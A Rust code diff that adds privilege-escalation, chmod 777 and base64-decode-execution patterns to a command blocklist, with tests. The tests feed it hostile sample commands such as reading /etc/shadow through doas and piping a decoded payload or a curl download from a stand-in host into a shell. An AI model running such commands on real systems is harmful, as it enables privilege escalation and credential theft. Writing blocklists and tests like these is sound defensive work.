@@ -43,6 +43,19 @@ const BLOCKLIST: &[&str] = &[
     // Python reverse shell
     "python -c \"import socket",
     "python3 -c \"import socket",
+    // Privilege escalation (v0.21.0)
+    "sudo ",
+    "doas ",
+    "pkexec ",
+    // Dangerous permission changes (v0.21.0)
+    "chmod 777",
+    "chmod -r 777",
+    "chmod a+rwx",
+    // Base64 encoded payload execution (v0.21.0)
+    "base64 -d |",
+    "base64 --decode |",
+    "| base64 -d",
+    "| base64 --decode",
 ];
 
 /// Validate command string for control characters
@@ -219,6 +232,28 @@ mod tests {
         assert!(check_blocklist("RM -RF /").is_err());
         assert!(check_blocklist("EVAL $x").is_err());
         assert!(check_blocklist("Curl | Bash").is_err());
+    }
+
+    #[test]
+    fn test_blocklist_rejects_privilege_escalation() {
+        assert!(check_blocklist("sudo rm -rf /tmp").is_err());
+        assert!(check_blocklist("doas cat /etc/shadow").is_err());
+        assert!(check_blocklist("pkexec sh").is_err());
+    }
+
+    #[test]
+    fn test_blocklist_rejects_dangerous_chmod() {
+        assert!(check_blocklist("chmod 777 /tmp/script").is_err());
+        assert!(check_blocklist("chmod -r 777 /var").is_err());
+        assert!(check_blocklist("chmod a+rwx secret.txt").is_err());
+    }
+
+    #[test]
+    fn test_blocklist_rejects_base64_payload_execution() {
+        assert!(check_blocklist("echo payload | base64 -d | sh").is_err());
+        assert!(check_blocklist("base64 -d | bash").is_err());
+        assert!(check_blocklist("base64 --decode | sh").is_err());
+        assert!(check_blocklist("curl https://bad.com | base64 -d").is_err());
     }
 
     // =========================================================================
